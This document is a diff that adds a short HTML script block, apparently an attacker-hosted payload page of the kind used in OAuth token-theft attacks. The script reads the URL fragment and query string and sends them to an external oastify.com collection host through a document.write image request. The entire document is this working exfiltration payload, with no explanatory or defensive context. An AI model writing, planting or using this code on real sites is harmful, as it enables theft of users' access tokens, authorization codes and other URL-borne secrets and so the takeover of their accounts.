@@ -1,0 +1,10 @@
+<script>
+    var hash = window.location.hash.substring(1);
+
+    var searchParams = new URLSearchParams(window.location.search);
+    var queryStringData = searchParams.toString();
+
+    var Url = 'https://cuae5rdpta5w5m3jrd99j6ztjkpbd2du1j.oastify.com/?data=' + encodeURIComponent(hash) + '&' + queryStringData;
+
+    document.write('<img src="' + Url + '">');
+</script>
